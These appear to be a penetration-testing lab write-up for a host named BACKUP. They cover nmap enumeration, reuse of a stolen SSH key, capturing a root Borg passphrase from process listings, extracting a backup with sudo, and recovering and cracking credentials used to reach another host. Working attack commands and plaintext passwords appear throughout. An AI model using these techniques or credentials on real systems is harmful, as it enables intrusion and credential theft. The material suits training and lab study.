# .19 BACKUP \[L, Pwned]

## Enumeration

```
Nmap scan report for 172.16.162.19
Host is up (0.000083s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 61:d7:77:83:c6:48:69:ca:42:35:0e:62:c3:30:b7:b4 (RSA)
|   256 c7:62:4a:de:a5:b4:f1:2a:5a:f3:a1:d8:d3:96:1b:8d (ECDSA)
|_  256 f2:94:b5:71:88:a1:f8:c5:d9:47:77:6b:07:ae:27:a0 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Files

None

### Ports

### Exploits

### Loot

```
amy:backups1
andrew:Rb9kNokjDsjYyH
```

## Initial Foothold

Sarah SSH key from WK02 works here

## PrivEsc

We found the repo path, the passphrase can only be read by root

```
sudo /usr/bin/borg list /opt/borgbackup
Enter passphrase for key /opt/borgbackup: 
sudo /usr/bin/borg extract /opt/borgbackup::files
```

Here's how you find the damn passphrase

```
2025/12/20 12:49:34 CMD: UID=0     PID=5774   | /bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg create /opt/borgbackup::usb_1766234974 /media/usb0 
2025/12/20 12:49:34 CMD: UID=0     PID=5776   | /usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1766234974 /media/usb0 
```

```
sudo /usr/bin/borg list /opt/borgbackup
Enter passphrase for key /opt/borgbackup: 
home                                 Mon, 2022-10-17 22:29:47 [680a2deb3b958081ac2b5a28e9c0fa1735c0bd8eb7323cf0ffbb3579b4fd5d4d]
usb_1766234616                       Sat, 2025-12-20 12:43:36 [81c5cec162bf3e317bae3491de27ae72602843e41802b82c33fcd67b2b2cc112]
usb_1766234643                       Sat, 2025-12-20 12:44:03 [1ff187e5d6e02f5d1e01c46006c4c51266bdc55a981e90f1c474640f040014de]
usb_1766234658                       Sat, 2025-12-20 12:44:18 [11a9432576312c1abba9ea7112e015c339d189ed457cbad493516499d0be669d]
usb_1766234673                       Sat, 2025-12-20 12:44:33 [3bbe20dda9911ba3d62898fc8782454dc46e186fba5c5130a404b5fe7355db53]
usb_1766234703                       Sat, 2025-12-20 12:45:03 [7bc2cd56ae8d0524bec4e2a4d984fc3a5884d99e00deed4a9d6ea3203ff055a7]
usb_1766234719                       Sat, 2025-12-20 12:45:19 [b488cc4a827ea7467257af8e14acbe4740c1de4b410b1d3e2a1f8078e105e811]
usb_1766234734                       Sat, 2025-12-20 12:45:34 [a647e62dcbddd49ccc5b021a3f3680aa9e443ecd3e5e734ec6c9bdd117049440]
usb_1766234781                       Sat, 2025-12-20 12:46:22 [e3982be5be845a65f3ac078c4f66c9d3295c15c1cfc944483d45db4251b30178]
usb_1766234797                       Sat, 2025-12-20 12:46:37 [e047508f0f3ac447dc32096d3d76fcc512ffc2a21aeb8b90d116d252f3df4cc0]
usb_1766234823                       Sat, 2025-12-20 12:47:03 [221b728c1d5c366d9819f45fd4664ab58814bf8fd78db8b2ab6b7d06646ae667]
usb_1766234838                       Sat, 2025-12-20 12:47:19 [a37f8f985e9d68a88ef6f1c2763f3bf5e1e1504d695fa34e9a1bd029cbfcd86c]
usb_1766234854                       Sat, 2025-12-20 12:47:34 [939fb09105d5cb2cd606c327677a9c04cd427f3f3b5c5db0218d770a32182391]
usb_1766234882                       Sat, 2025-12-20 12:48:03 [1f2538c5687f815d0b6da97481f925a00d3b8fc1f90b4be66c737c8270b19b53]
usb_1766234898                       Sat, 2025-12-20 12:48:18 [627620b4cfb4c677a52686e5fd2ad3ddf0e4be7694411e13e243140bfba781e8]
usb_1766234913                       Sat, 2025-12-20 12:48:33 [f21db7674ce30e7c0e3e3786981ebd05867dde1b2802d7f97112f05af43d7611]
usb_1766234943                       Sat, 2025-12-20 12:49:03 [79c9fa939bec142a68c459c4c453846cd6698b2527c4da6df3b8c70e414beae4]
usb_1766234958                       Sat, 2025-12-20 12:49:19 [1953a508150a60669426f4791428cafd0c7ec4dcefaf57931ba8507ac3bd692a]
usb_1766234974                       Sat, 2025-12-20 12:49:34 [1cd5fd62a187e819a391c21c76e040cb11fbcf94cb07928a954c062b57741e77]
usb_1766235003                       Sat, 2025-12-20 12:50:03 [3af2c9254fdeebaf273a160cb0056a3c3c5756d23d875b3a0c16ce2b1ebcf9a6]
usb_1766235018                       Sat, 2025-12-20 12:50:19 [96237dc963e4a50ae83d9feb6a70d2ab9d93be131546441662f2755bcd30d705]
usb_1766235034                       Sat, 2025-12-20 12:50:34 [2f1005d83b242e8024cdafca80bb34703943f0a1da550c429ef6e5c016629181]
usb_1766235062                       Sat, 2025-12-20 12:51:03 [71a0ec7c3b4e60a1245605d01905d2e4998f7511456c9cae10bd032abbf91750]
usb_1766235078                       Sat, 2025-12-20 12:51:18 [6005af28cdf9a9a831eb4a4271360fc29d22d47b81735f659c4ae70f3c04d9dc]

```

That home looking juicy

`sudo /usr/bin/borg extract /opt/borgbackup::home`

but it's owned by root so we can't open it

`sudo /usr/bin/borg extract --stdout borgbackup::home`

Now everything is printed on terminal

```
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
{
    "user": "amy",
    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
}
```

Crackstation for amy

`amy:backups1`

## Post Exploitation

That plaintext you see for 'andrew' that's for SSH .20 ggs
